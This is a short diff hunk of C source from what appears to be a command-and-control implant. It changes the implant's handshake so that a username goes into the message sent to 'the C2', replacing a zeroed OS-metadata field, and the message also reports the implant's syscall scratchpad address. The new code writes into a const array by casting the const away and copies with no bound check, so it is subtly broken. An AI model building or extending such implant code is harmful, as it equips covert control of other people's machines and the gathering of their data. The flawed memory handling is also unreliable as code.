@@ -38,11 +38,12 @@ size_t createHandshake(char* resp, size_t respMax) {
     size_t offset = 0;
 
 
-    // 2. OS Metadata (8 bytes)
-    // For authorized assessments, use GetVersionEx or hardcode a target placeholder
-    unsigned long long os = 0; 
-    memcpy(resp + offset, &os, 8);
-    offset += 8;
+    // 2. Username
+    const char username[255] = "";
+    ZeroMemory((void*)username, 255);
+    memcpy((void*)username, USER_NAME, sizeof(USER_NAME));    
+    memcpy(resp + offset, username, 255);
+    offset += 255;
 
     // 3. Scratchpad Address (8 bytes)
     // This informs the C2 where our syscall/string memory is located
